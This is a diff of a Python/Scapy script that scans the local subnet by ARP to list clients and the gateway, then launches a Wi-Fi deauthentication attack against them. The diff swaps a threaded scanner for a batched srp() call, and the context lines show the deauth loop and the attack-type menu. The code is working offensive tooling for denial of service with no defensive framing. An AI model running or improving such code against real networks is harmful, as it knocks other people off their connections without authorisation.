@@ -59,39 +59,27 @@ def deauth(type, clientNum = 0):
 				sendDeauthPacket(gateway[0], gateway[1], client[0], client[1])
 		print(paintString('!Stop deauth!', green))
 		
-def ARP_Scanner(start):	#Arp - Send&Recive
-	for i in range(start, len(ipAdrs), len(threads)):
-		send_packet = Ether(dst='FF:FF:FF:FF:FF:FF') / ARP(pdst=ipAdrs[i])
-		recive_packet = srp1(send_packet, verbose=0, timeout=0.1)
-		if recive_packet:
-			clients.append([recive_packet.psrc, recive_packet.hwsrc])
-			end='\n'
-			if recive_packet.psrc == ipAdrs[0]:
-				gateway.append(recive_packet.psrc)
-				gateway.append(recive_packet.hwsrc)
-				end=' [ {0} ]\n'.format(paintString('GATEWAY', yellow))
-			print('[ {0} ] {1}\t{2}'.format(paintString(str(len(clients)), red), clients[len(clients) - 1][0], clients[len(clients) - 1][1]), end=end)
-			
-
-def ARP_Start():
-	lan_ip = getLanIp()
-	splited_lan_ip = lan_ip.split('.')
+def ARP_Scanner():	#Arp - Send&Recive
+	lanIp = getLanIp()
+	splitedLanIp = lanIp.split('.')
 	for i in range(1, 255):
-		ipAdrs.append(splited_lan_ip[0] + '.' + splited_lan_ip[1] + '.' + splited_lan_ip[2] + '.' + str(i))
-
-	for i in range(0, 15):
-		threads.append(threading.Thread(target=ARP_Scanner, args=[i]))
-
-	for thread in threads:
-		thread.start()
-	for thread in threads:
-		thread.join()
-
+		ipAdrs.append(splitedLanIp[0] + '.' + splitedLanIp[1] + '.' + splitedLanIp[2] + '.' + str(i))
+	arpPaket = Ether(dst='FF:FF:FF:FF:FF:FF') / ARP(pdst=ipAdrs)
+	ans, nans = srp(arpPaket, verbose=0, timeout=0.1)
+	for client in ans:
+		clients.append([client[len(client) - 1].psrc, client[len(client) - 1].hwsrc])
+		end='\n'
+		if client[len(client) - 1].psrc == ipAdrs[0]:
+			gateway.append(client[len(client) - 1].psrc)
+			gateway.append(client[len(client) - 1].hwsrc)
+			end=' [ {0} ]\n'.format(paintString('GATEWAY', yellow))
+		print('[ {0} ] {1}\t{2}'.format(paintString(str(len(clients)), red), clients[len(clients) - 1][0], clients[len(clients) - 1][1]), end=end)
+			
 if __name__ == '__main__':      
 	try:      
 		print(paintString('|--------------ARP Scanner---------------|', green))
 		print(paintString('         [ IP ]\t\t     [ MAC ] ', blue))
-		ARP_Start()	
+		ARP_Scanner()	
 		print(paintString('|--------------ARP Scanner---------------|', green))
 
 		while typeAttack < 1 or typeAttack > 2:
